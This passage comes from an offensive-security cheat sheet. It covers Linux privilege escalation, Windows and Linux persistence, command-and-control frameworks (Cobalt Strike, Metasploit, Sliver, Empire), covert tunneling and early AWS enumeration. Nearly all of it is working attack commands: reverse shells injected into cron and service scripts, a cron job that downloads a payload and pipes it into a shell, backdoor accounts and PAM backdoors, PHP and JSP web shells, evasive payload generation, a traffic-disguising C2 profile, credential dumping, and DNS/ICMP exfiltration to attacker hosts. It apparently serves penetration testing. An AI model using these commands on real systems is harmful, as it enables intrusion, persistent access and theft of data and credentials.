# Explanation: Uses debug privileges for token elevation

8.2 Linux Privilege Escalation

LinPEAS - Automated Linux Enumeration
bash
# Comprehensive system scanning
./linpeas.sh -a -s -r report.html
# Use Case: Automated Linux privilege escalation enumeration
# Explanation: Runs all checks with HTML report output

# Quick assessment mode
./linpeas.sh -quick
# Use Case: Fast initial assessment
# Explanation: Runs quick checks for common vectors

# Stealth mode operation
./linpeas.sh -t -p -i
# Use Case: Stealthy enumeration
# Explanation: Uses techniques to avoid detection

# Custom checks and filters
./linpeas.sh -e /tmp/extra_checks.txt
# Use Case: Extended enumeration
# Explanation: Adds custom checks to standard enumeration

LinuxExploitSuggester - Kernel Exploit Identification
bash
# Kernel exploit suggestions
python3 linux-exploit-suggester.py --kernel 3.13.0
# Use Case: Identifying applicable kernel exploits
# Explanation: Suggests exploits based on kernel version

# Comprehensive system checking
./linux-exploit-suggester.sh --checkall
# Use Case: Full system exploit assessment
# Explanation: Checks all possible exploit vectors

# Offline kernel analysis
python3 linux-exploit-suggester.py --kernel 3.13.0 --distro ubuntu --release 14.04
# Use Case: Offline exploit research
# Explanation: Suggests exploits without live system access

SUID/SGID Exploitation
bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# Use Case: Finding privileged executables
# Explanation: Locates SUID and SGID binaries

# Common SUID exploitation techniques
# find privilege escalation
find . -exec /bin/sh \; -quit

# nano/vim privilege escalation
nano /etc/passwd
vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# bash privilege escalation
bash -p

# cp/mv privilege escalation
cp /bin/bash /tmp/bash && chmod +s /tmp/bash

# Common exploitable SUID binaries
# nmap, vim, find, bash, less, more, nano, cp, mv

Capabilities Exploitation
bash
# Find files with capabilities
getcap -r / 2>/dev/null
# Use Case: Finding capability-based privilege escalation
# Explanation: Locates files with Linux capabilities

# Common capability exploits
# perl capability escalation
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# python capability escalation
python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# php capability escalation
php -r "posix_setuid(0); system('/bin/sh');"

# tar capability escalation
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

Sudo Privilege Escalation
bash
# Check sudo permissions
sudo -l
# Use Case: Identifying sudo-based escalation vectors
# Explanation: Shows commands available through sudo

# Common sudo exploitation techniques
# sudo vi/vim
sudo vi -c '!sh'

# sudo find
sudo find / -exec sh -i \;

# sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# sudo less/more
sudo less /etc/hosts
!/bin/sh

# sudo man
sudo man man
!/bin/sh

# sudo git
sudo git help status
!/bin/sh

# Sudo environment variable abuse
sudo PYTHONPATH=/tmp python script.py
# Use Case: Environment variable manipulation
# Explanation: Uses environment variables for privilege escalation


Docker & Container Escapes
bash
# Check for container
cat /proc/1/cgroup
ls -la /.dockerenv
# Use Case: Container environment detection
# Explanation: Identifies if running in container

# Docker socket exploitation
docker run -v /:/host -it alpine chroot /host /bin/sh
# Use Case: Docker socket privilege escalation
# Explanation: Uses Docker socket access for host escape

# Privileged container escape
docker run --privileged -v /:/host -it alpine chroot /host /bin/sh
# Use Case: Privileged container escape
# Explanation: Escapes privileged containers to host

# Capabilities-based escape
docker run --cap-add=ALL -v /:/host -it alpine chroot /host /bin/sh
# Use Case: Capability-based container escape
# Explanation: Uses container capabilities for host access


8.3 Service Abuse & Misconfigurations

Windows Service Exploitation
powershell
# Unquoted service path exploitation
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -like "* *" -and $_.PathName -notlike '"*"'}
# Use Case: Finding unquoted service paths
# Explanation: Identifies services vulnerable to path interception

# Service permission analysis
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *
# Use Case: Service permission enumeration
# Explanation: Checks service permissions for weak settings

# Service binary replacement
sc config VulnerableService binPath= "net localgroup administrators user /add"
sc stop VulnerableService
sc start VulnerableService
# Use Case: Service binary hijacking
# Explanation: Replaces service binaries for privilege escalation


Linux Service Exploitation
bash
# World-writable service files
find /etc/systemd/system /usr/lib/systemd/system -type f -perm -o+w 2>/dev/null
# Use Case: Finding writable service files
# Explanation: Locates systemd service files with weak permissions

# Service script exploitation
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f" >> /etc/cron.daily/backup.sh
# Use Case: Service script modification
# Explanation: Adds reverse shell to service scripts

# Init script exploitation
find /etc/init.d /etc/rc.d -type f -perm -o+w 2>/dev/null
# Use Case: Init script privilege escalation
# Explanation: Finds writable init scripts

8.4 Scheduled Task & Cron Exploitation

Windows Scheduled Tasks
powershell
# Scheduled task enumeration
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
# Use Case: Finding scheduled tasks for exploitation
# Explanation: Enumerates scheduled tasks for weak permissions

# Scheduled task creation for persistence
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\System32\malware.exe" /sc minute /mo 30 /ru SYSTEM
# Use Case: Scheduled task privilege escalation
# Explanation: Creates scheduled tasks for code execution

# WMI event subscription
Get-WmiObject -Namespace root\Subscription -Class __EventFilter
Get-WmiObject -Namespace root\Subscription -Class __EventConsumer
Get-WmiObject -Namespace root\Subscription -Class __FilterToConsumerBinding
# Use Case: WMI event-based persistence
# Explanation: Checks for WMI event subscriptions

Linux Cron Jobs
bash
# Cron job enumeration
crontab -l
cat /etc/crontab
ls -la /etc/cron.*/*
# Use Case: Finding cron jobs for exploitation
# Explanation: Enumerates cron jobs and their permissions

# Writable cron script exploitation
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" >> /etc/cron.hourly/cleanup.sh
# Use Case: Cron script modification
# Explanation: Adds reverse shell to cron scripts

# Cron wildcard exploitation
# In vulnerable backup script: tar -zcf /backups/backup-*.tar.gz *
mkdir -p /tmp/--checkpoint=1
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f' > /tmp/--checkpoint-action=exec=sh.sh
# Use Case: Tar wildcard injection
# Explanation: Exploits tar wildcard usage in cron jobs

9.PERSISTENCE MECHANISMS

9.1 Windows Persistence

Registry Persistence Methods
cmd
# Run key persistence
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\malware.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\malware.exe"
# Use Case: Registry-based persistence
# Explanation: Adds entries to run keys for automatic execution

# Alternative registry locations
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Update /t REG_SZ /d "C:\Windows\Temp\malware.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /v Update /t REG_SZ /d "C:\Windows\Temp\malware.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /t REG_SZ /d "C:\Windows\Temp\malware.exe"
# Use Case: Multiple registry persistence points
# Explanation: Uses various registry locations for redundancy

# COM hijacking persistence
reg add "HKCU\Software\Classes\CLSID\{UNIQUE-GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\malware.dll"
# Use Case: COM component hijacking
# Explanation: Hijacks COM components for persistence


Scheduled Task Persistence
cmd
# Scheduled task creation
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\malware.exe" /sc minute /mo 30 /ru SYSTEM
schtasks /create /tn "Cleanup" /tr "cmd.exe /c powershell -ep bypass -f C:\Temp\payload.ps1" /sc onlogon /ru USERNAME
# Use Case: Scheduled task-based persistence
# Explanation: Creates scheduled tasks for recurring execution

# Hidden scheduled tasks
schtasks /create /tn "Microsoft\Windows\SystemRestore\Update" /tr "C:\Windows\Temp\malware.exe" /sc hourly /ru SYSTEM
# Use Case: Stealthy scheduled tasks
# Explanation: Creates tasks in system folders for hiding

# Event-triggered tasks
schtasks /create /tn "SecurityScan" /tr "C:\Windows\Temp\malware.exe" /sc onevent /ec System /mo "*[System/EventID=4624]"
# Use Case: Event-driven persistence
# Explanation: Triggers execution based on system events

WMI Event Subscription Persistence

cmd
# WMI event filter creation
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="UpdateFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
# Use Case: WMI-based persistence
# Explanation: Creates WMI event filters for triggered execution

# WMI event consumer
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="UpdateConsumer", ExecutablePath="C:\Windows\Temp\malware.exe", CommandLineTemplate="C:\Windows\Temp\malware.exe"
# Use Case: WMI event consumer creation
# Explanation: Defines what executes when event triggers

# WMI filter to consumer binding
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name="UpdateFilter"', Consumer='CommandLineEventConsumer.Name="UpdateConsumer"'
# Use Case: WMI binding creation
# Explanation: Links event filters to consumers

Service Persistence
cmd
# Service creation
sc create "WindowsUpdate" binPath= "C:\Windows\Temp\malware.exe" start= auto
sc start WindowsUpdate
# Use Case: Service-based persistence
# Explanation: Creates Windows services for automatic execution

# Service modification
sc config "VulnerableService" binPath= "C:\Windows\Temp\malware.exe"
sc stop VulnerableService
sc start VulnerableService
# Use Case: Existing service modification
# Explanation: Modifies existing services for persistence

# Service DLL hijacking
sc config "AudioSrv" binPath= "C:\Windows\System32\malicious.dll"
# Use Case: Service DLL replacement
# Explanation: Replaces service DLLs with malicious ones

9.2 Linux Persistence

Cron Persistence Methods
bash
# User crontab persistence
echo "*/5 * * * * curl http://10.10.10.10/payload.sh | sh" | crontab -
(crontab -l ; echo "*/10 * * * * /tmp/.backdoor") | crontab -
# Use Case: User-level cron persistence
# Explanation: Adds cron jobs to user crontab

# System crontab persistence
echo "*/5 * * * * root /tmp/.backdoor" >> /etc/crontab
echo "@reboot root /tmp/.backdoor" >> /etc/crontab
# Use Case: System-level cron persistence
# Explanation: Adds entries to system crontab

# Cron directory persistence
echo "*/5 * * * * /tmp/.backdoor" > /etc/cron.d/persistence
chmod +x /etc/cron.d/persistence
# Use Case: Cron directory-based persistence
# Explanation: Creates files in cron directories

Service Persistence
bash
# Systemd service creation
cat > /etc/systemd/system/network-update.service << EOF
[Unit]
Description=Network Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /tmp/.backdoor; sleep 30; done'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

systemctl enable network-update.service
systemctl start network-update.service
# Use Case: Systemd service persistence
# Explanation: Creates systemd services for automatic execution

# Init.d service persistence
cp backdoor.sh /etc/init.d/
chmod +x /etc/init.d/backdoor.sh
update-rc.d backdoor.sh defaults
# Use Case: Init.d service persistence
# Explanation: Uses traditional init system for persistence

# RC.local persistence
echo "/tmp/.backdoor &" >> /etc/rc.local
chmod +x /etc/rc.local
# Use Case: Boot-time persistence
# Explanation: Adds execution to rc.local for boot-time running

SSH Persistence
bash
# Authorized keys persistence
echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys
# Use Case: SSH key-based persistence
# Explanation: Adds attacker's SSH key for remote access

# Backdoor user creation
useradd -r -s /bin/bash -G sudo backdooruser
echo 'backdooruser:Password123!' | chpasswd
# Use Case: Hidden user account creation
# Explanation: Creates hidden user accounts for access

# SSH config modification
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "AllowUsers backdooruser" >> /etc/ssh/sshd_config
systemctl restart ssh
# Use Case: SSH service configuration modification
# Explanation: Modifies SSH config for persistent access

# SSH backdoor with PAM
echo "auth sufficient pam_exec.so quiet /tmp/backdoor.sh" >> /etc/pam.d/sshd
# Use Case: PAM-based SSH backdoor
# Explanation: Uses PAM modules for authentication bypass

9.3 Application Persistence

Browser Persistence
bash
# Chrome extension persistence
# Create malicious Chrome extension and install
# Use Case: Browser-based persistence
# Explanation: Installs malicious browser extensions

# Firefox persistence through autoconfig
echo 'pref("general.config.filename", "mozilla.cfg");' > /usr/lib/firefox/defaults/pref/local-settings.js
echo 'lockPref("browser.startup.homepage", "http://malicious.com");' > /usr/lib/firefox/mozilla.cfg
# Use Case: Firefox configuration persistence
# Explanation: Modifies Firefox configuration for persistence

Office & Document Persistence
powershell
# Word document macro persistence
# Create Word document with auto-executing macro
# Use Case: Document-based persistence
# Explanation: Uses Office macros for code execution

# Excel add-in persistence
# Create malicious Excel add-in
# Use Case: Excel-based persistence
# Explanation: Uses Excel add-ins for persistence

# Office template modification
Copy-Item "C:\Windows\Temp\malware.dotm" "C:\Program Files\Microsoft Office\Root\Office16\STARTUP\"
# Use Case: Office template persistence
# Explanation: Modifies Office templates for automatic execution

9.4 Network Persistence

Netcat Backdoors
bash
# Netcat persistent backdoor
nc -lvp 4444 -e /bin/bash
# Use Case: Simple network backdoor
# Explanation: Creates netcat listener with command execution

# Netcat with persistence script
while true; do nc -lvp 4444 -e /bin/bash; done
# Use Case: Resilient netcat backdoor
# Explanation: Automatically restarts netcat if it dies

# Socat persistent backdoor
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
# Use Case: Advanced network backdoor
# Explanation: Uses socat for more reliable backdoors

Web Shell Persistence
bash
# PHP web shell deployment
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/backdoor.php
# Use Case: Web-based persistence
# Explanation: Deploys web shells for remote access

# ASP.NET web shell
echo '<%@ Page Language="C#" %>...' > C:\inetpub\wwwroot\backdoor.aspx
# Use Case: Windows web server persistence
# Explanation: Deploys ASP.NET web shells

# JSP web shell
echo '<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>' > /opt/tomcat/webapps/ROOT/backdoor.jsp
# Use Case: Java web application persistence
# Explanation: Deploys JSP web shells

10.COMMAND & CONTROL

10.1 Cobalt Strike

Beacon Configuration & Setup
text
# HTTP/HTTPS Beacon Configuration
set payload windows/beacon_http/reverse_http
set payload windows/beacon_https/reverse_https
set host 10.10.10.10
set port 80
set sleeptime 30000
set jitter 20
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
set watermark 12345678
# Use Case: Standard HTTP/HTTPS C2 channels
# Explanation: Configures basic Beacon settings for communication

# DNS Beacon Configuration
set payload windows/beacon_dns/reverse_dns
set dns_beacon dns1.domain.com
set dns_idle 8.8.8.8
set dns_sleep 0
set dns_ttl 5
# Use Case: DNS-based C2 for restricted environments
# Explanation: Uses DNS queries for covert communication

# SMB Beacon Configuration
set payload windows/beacon_smb/bind_pipe
set pipename msagent_##
# Use Case: Lateral movement and peer-to-peer communication
# Explanation: Uses named pipes for internal network communication

# Advanced Beacon Settings
set max_retries 0
set exit_thread true
set obfuscate true
set smart_encoding true
set cleanup true
# Use Case: Operational security and evasion
# Explanation: Advanced settings for stealth and persistence

Malleable C2 Profile Examples
text
# Amazon-like Traffic Profile
http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0";
        
        metadata {
            base64url;
            prepend "session-token=";
            parameter "session-token";
        }
    }
    
    server {
        header "Server" "Server";
        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
        header "x-amz-id-2" "a21yZXR5MGFvYWhvNGc0OVBoTVBLV1FKV01WeE1nRnR0c1dwd05TZVZ1eXFVU0dXeU1n";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Content-Encoding" "gzip";
        
        output {
            netbios;
            prepend "{\"products\":";
            append "}";
            print;
        }
    }
}

http-post {
    set uri "/N4215/adj/amzn.us.sr.aps";
    client {
        header "Accept" "*/*";
        header "Accept-Encoding" "gzip, deflate";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0";
        header "Content-Type" "text/xml";
        
        id {
            base64url;
            prepend "session-token=";
            parameter "session-token";
        }
        
        parameter "sz" "160x600";
        parameter "oe" "oe=ISO-8859-1;";
        
        output {
            base64;
            prepend "{
                \"a\":\"";
            append "\",
                \"n\":\"24\"
            }";
            print;
        }
    }
    
    server {
        header "Server" "Server";
        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
        header "x-amz-id-2" "a21yZXR5MGFvYWhvNGc0OVBoTVBLV1FKV01WeE1nRnR0c1dwd05TZVZ1eXFVU0dXeU1n";
        header "X-Frame-Options" "SAMEORIGIN";
        
        output {
            netbios;
            print;
        }
    }
}
Post-Exploitation Commands

text
# Privilege Escalation
beacon> elevate svc-exe
beacon> elevate uac-token-duplication
beacon> elevate getsystem
# Use Case: Gaining higher privileges
# Explanation: Various methods to escalate privileges on target

# Process Injection & Migration
beacon> inject 1234 x64 tcp
beacon> migrate 5678
beacon> shinject 1234 /tmp/shellcode.bin
# Use Case: Code injection and process migration
# Explanation: Injects shellcode or migrates to stable processes

# Token Manipulation
beacon> make_token DOMAIN\User Password123
beacon> steal_token 1234
beacon> rev2self
# Use Case: Impersonating users and tokens
# Explanation: Manipulates tokens for lateral movement

# Lateral Movement
beacon> jump psexec64 10.10.10.5
beacon> jump winrm64 10.10.10.5
beacon> jump wmi64 10.10.10.5
# Use Case: Moving between systems
# Explanation: Various methods for lateral movement

# Persistence Mechanisms
beacon> persistence schtasks-backdoor
beacon> persistence registry-backdoor
beacon> persistence service-backdoor
# Use Case: Maintaining access
# Explanation: Different persistence mechanisms

# Information Gathering
beacon> logonpasswords
beacon> mimikatz sekurlsa::logonpasswords
beacon> hashdump
beacon> net view
beacon> portscan 10.10.10.0/24 445,3389,5985
# Use Case: Post-exploitation reconnaissance
# Explanation: Gathers credentials and network information

Aggressor Script Examples
text
# Custom Beacon Commands
alias custom-cmd {
    local('$output');
    $output = beacon_exec($1, "whoami /all");
    blog($1, "Custom command output: " . $output);
}

# Automated Lateral Movement
popup beacon_bottom {
    item "&Deploy Beacon to Network" {
        local('$computers');
        $computers = beacon_exec($1, "net view");
        # Parse computers and deploy
    }
}

# Reporting Automation
on beacon_initial {
    show_message("New beacon from " . beacon_info($1, "internal"));
    log_to_file("C:\\beacons.log", beacon_info($1, "computer") . " - " . beacon_info($1, "user"));
}

10.2 Metasploit Framework

Payload Generation & Handling
bash
# Windows Payload Generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe
# Use Case: Creating Windows executables
# Explanation: Generates encoded Windows payloads

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o payload.dll
# Use Case: DLL payloads for injection
# Explanation: Creates DLL format payloads

msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f psh-cmd -o payload.ps1
# Use Case: PowerShell payloads
# Explanation: Generates PowerShell commands for execution

# Linux Payload Generation
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o payload.elf
# Use Case: Linux binary payloads
# Explanation: Creates ELF binaries for Linux systems

msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f c -e x86/shikata_ga_nai
# Use Case: Shellcode for custom loaders
# Explanation: Generates C-style shellcode

# Web Payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o payload.php
# Use Case: Web application payloads
# Explanation: Creates PHP web shells

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war -o payload.war
# Use Case: Java web application payloads
# Explanation: Creates WAR files for Java apps

# Advanced Encoding & Obfuscation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 -x legitsvc.exe -k -o malicious.exe
# Use Case: Evasion techniques
# Explanation: Uses encoding, iteration, and template binaries

Handler Setup & Management
bash
# Multi-Handler Setup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; set ExitOnSession false; set EnableStageEncoding true; set StageEncoder x86/fnstenv_mov; exploit -j -z"
# Use Case: Automated handler setup
# Explanation: Starts handler with advanced options

# Resource Scripts for Automation
echo "use exploit/multi/handler" > handler.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> handler.rc
echo "set LHOST 10.10.10.10" >> handler.rc
echo "set LPORT 4444" >> handler.rc
echo "set ExitOnSession false" >> handler.rc
echo "exploit -j" >> handler.rc

msfconsole -r handler.rc
# Use Case: Automated handler deployment
# Explanation: Uses resource files for consistent setup

# Advanced Handler Configuration
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 10.10.10.10; set LPORT 443; set HandlerSSLCert /path/to/cert.pem; set StagerVerifySSLCert true; set OverrideLHOST 10.10.10.10; set OverrideRequestHost true; exploit -j"
# Use Case: SSL/TLS encrypted C2
# Explanation: Configures HTTPS handler with certificate

Meterpreter Commands
bash
# Core System Commands
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > rev2self
# Use Case: System information and privileges
# Explanation: Basic system reconnaissance and privilege escalation

# File System Operations
meterpreter > pwd
meterpreter > ls
meterpreter > download file.txt
meterpreter > upload malicious.exe C:\\Windows\\Temp\\
meterpreter > edit file.txt
# Use Case: File system interaction
# Explanation: Navigate, transfer, and edit files

# Process Management
meterpreter > ps
meterpreter > migrate 1234
meterpreter > kill 5678
meterpreter > execute -f cmd.exe -i
meterpreter > execute -H -f notepad.exe
# Use Case: Process manipulation
# Explanation: Manage and migrate between processes

# Network Reconnaissance
meterpreter > ipconfig
meterpreter > route
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
meterpreter > arp
# Use Case: Network information and pivoting
# Explanation: Network configuration and port forwarding

# Privilege Escalation
meterpreter > run post/windows/gather/win_privs
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > getsystem
meterpreter > run bypassuac
# Use Case: System privilege escalation
# Explanation: Various methods to gain higher privileges

# Credential Harvesting
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
meterpreter > golden_ticket_create
# Use Case: Credential access and persistence
# Explanation: Dump credentials and create golden tickets

# Persistence Mechanisms
meterpreter > run persistence -X -i 30 -p 443 -r 10.10.10.10
meterpreter > run metsvc
meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v Update -d 'C:\\windows\\temp\\malware.exe'
# Use Case: Maintaining access
# Explanation: Various persistence methods

10.3 Custom C2 Frameworks

Sliver C2 Framework
bash
# Implant Generation
sliver generate --mtls 10.10.10.10 --os windows --arch amd64 --save /tmp/payload.exe
# Use Case: Cross-platform implant creation
# Explanation: Generates implants for various platforms

sliver generate --http 10.10.10.10 --os linux --arch amd64 --format elf
# Use Case: HTTP-based Linux implants
# Explanation: Creates ELF binaries with HTTP C2

sliver generate --dns example.com --os windows --arch amd64 --skip-symbols
# Use Case: DNS-based C2 channels
# Explanation: Uses DNS for covert communication

# Listener Management
sliver stage-listener --url tcp://10.10.10.10:4444 --profile windows_amd64
# Use Case: Staging server setup
# Explanation: Configures listeners for implant staging

sliver http --domain example.com --website /var/www/html
# Use Case: HTTP/S listener setup
# Explanation: Configures web-based C2 channels

sliver dns --domains c2.example.com --lhost 10.10.10.10
# Use Case: DNS listener configuration
# Explanation: Sets up DNS-based C2 infrastructure

# Implant Management
sliver implants --build
# Use Case: Implant compilation and management
# Explanation: Builds and manages implant configurations

sliver sessions -i
# Use Case: Active session management
# Explanation: Lists and interacts with active implants

sliver use ABC123
# Use Case: Session interaction
# Explanation: Switches to specific implant session

# Advanced Implant Features
sliver (ABC123) > ps
# Use Case: Process enumeration
# Explanation: Lists running processes on target

sliver (ABC123) > execute -o notepad.exe
# Use Case: Remote command execution
# Explanation: Executes commands on target system

sliver (ABC123) > migrate 1234
# Use Case: Process migration
# Explanation: Migrates implant to different process

sliver (ABC123) > getprivs
# Use Case: Privilege escalation
# Explanation: Attempts to gain higher privileges

sliver (ABC123) > loot
# Use Case: Data collection
# Explanation: Manages collected data and credentials

Empire & Starkiller
powershell
# Listener Setup
(Empire: listeners) > set Host http://10.10.10.10:80
(Empire: listeners) > set Port 80
(Empire: listeners) > set DefaultDelay 5
(Empire: listeners) > execute
# Use Case: HTTP listener configuration
# Explanation: Sets up Empire listeners for agents

# Stager Generation
(Empire: stagers) > set Listener http
(Empire: stagers) > set OutFile /tmp/launcher.exe
(Empire: stagers) > execute
# Use Case: Payload generation
# Explanation: Creates stagers for initial compromise

# Agent Interaction
(Empire: agents) > interact ABC123
(Empire: ABC123) > shell whoami
(Empire: ABC123) > upload /tmp/file.exe C:\\Windows\\Temp\\
(Empire: ABC123) > download C:\\Windows\\Temp\\file.txt
# Use Case: Agent command and control
# Explanation: Interacts with compromised systems

# Module Execution
(Empire: ABC123) > module credentials/mimikatz/logonpasswords
(Empire: ABC123) > execute
# Use Case: Post-exploitation modules
# Explanation: Runs various post-exploitation modules

(Empire: ABC123) > module lateral_movement/invoke_wmi
(Empire: ABC123) > set ComputerName 10.10.10.5
(Empire: ABC123) > set Listener http
(Empire: ABC123) > execute
# Use Case: Lateral movement
# Explanation: Moves to other systems in network

10.4 Covert Channels & Communication

DNS Tunneling
bash
# dnscat2 Setup
# Server (Attacker)
sudo ruby dnscat2.rb --dns domain=attacker.com --secret=MySecret
# Use Case: DNS-based C2 channels
# Explanation: Sets up DNS tunneling server

# Client (Target)
dnscat2.exe --dns server=attacker.com,port=53 --secret=MySecret
# Use Case: DNS client connection
# Explanation: Connects to DNS tunneling server

dnscat2.exe --dns domain=attacker.com --secret=MySecret --max-retransmits 5 --timeout 10
# Use Case: Advanced DNS tunneling
# Explanation: Configures retransmission and timeout settings

# Iodine DNS Tunneling
# Server (Attacker)
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
# Use Case: IP-over-DNS tunneling
# Explanation: Creates virtual network interface over DNS

# Client (Target)
iodine -f -P password tunnel.attacker.com
# Use Case: Client connection to DNS tunnel
# Explanation: Connects to iodine server

iodine -f -P password -r tunnel.attacker.com 8.8.8.8
# Use Case: DNS tunnel with specific resolver
# Explanation: Uses custom DNS resolver

HTTP/HTTPS Tunneling
bash
# reGeorg HTTP Tunneling
# Upload tunnel.aspx to web server
python reGeorgSocksProxy.py -p 8080 -u http://target.com/tunnel.aspx
# Use Case: HTTP-based SOCKS proxy
# Explanation: Creates SOCKS proxy through web shell

# Chisel Tunneling
# Server (Attacker)
./chisel server -p 8080 --reverse
# Use Case: TCP/UDP tunneling
# Explanation: Sets up chisel server for tunneling

# Client (Target)
./chisel client 10.10.10.10:8080 R:1080:socks
# Use Case: SOCKS proxy creation
# Explanation: Creates SOCKS proxy through tunnel

./chisel client 10.10.10.10:8080 R:2222:172.16.1.100:22
# Use Case: Port forwarding
# Explanation: Forwards specific ports through tunnel

# SSH Tunneling
ssh -D 1080 -p 22 user@target_ip
# Use Case: Dynamic port forwarding
# Explanation: Creates SOCKS proxy through SSH

ssh -L 8080:internal_host:80 user@target_ip
# Use Case: Local port forwarding
# Explanation: Forwards local port to remote service

ssh -R 2222:127.0.0.1:22 user@attacker_ip
# Use Case: Remote port forwarding
# Explanation: Exposes local service to remote host

ICMP & Protocol Tunneling
bash
# ptunnel-ng ICMP Tunneling
# Server (Attacker)
ptunnel-ng -x password -p 22 -l 2222
# Use Case: ICMP-based tunneling
# Explanation: Creates tunnel through ICMP packets

# Client (Target)
ptunnel-ng -x password -p target_ip:22 -l 1080 -r attacker_ip:2222
# Use Case: ICMP tunnel client
# Explanation: Connects to ICMP tunneling server

# ICMPExfil Data Exfiltration
python icmpexfil.py -s 10.10.10.10 -f secret.txt
# Use Case: Data exfiltration via ICMP
# Explanation: Sends files through ICMP packets

# DNSExfil Data Exfiltration
python dns_exfil.py --file secret.txt --domain attacker.com
# Use Case: Data exfiltration via DNS
# Explanation: Encodes data in DNS queries

11.CLOUD SECURITY

11.1 AWS Exploitation

AWS Reconnaissance & Enumeration
bash
# AWS CLI Basic Reconnaissance
aws sts get-caller-identity
# Use Case: Current user/role identification
# Explanation: Shows current AWS identity information

aws iam list-users
aws iam list-roles
aws iam list-groups
# Use Case: IAM user/role enumeration
# Explanation: Lists IAM users, roles, and groups

aws iam list-attached-user-policies --user-name target-user
aws iam list-user-policies --user-name target-user
# Use Case: User policy enumeration
# Explanation: Shows policies attached to specific users

aws ec2 describe-instances
aws ec2 describe-security-groups
aws ec2 describe-vpcs
# Use Case: EC2 infrastructure enumeration
# Explanation: Lists EC2 instances, security groups, and VPCs

aws s3 ls
aws s3api list-buckets
# Use Case: S3 bucket discovery
# Explanation: Lists available S3 buckets

# Pacu AWS Exploitation Framework
run aws__enumeration
# Use Case: Automated AWS enumeration
# Explanation: Runs comprehensive AWS reconnaissance

run iam__privesc_scan
# Use Case: IAM privilege escalation scanning
# Explanation: Identifies IAM privilege escalation paths
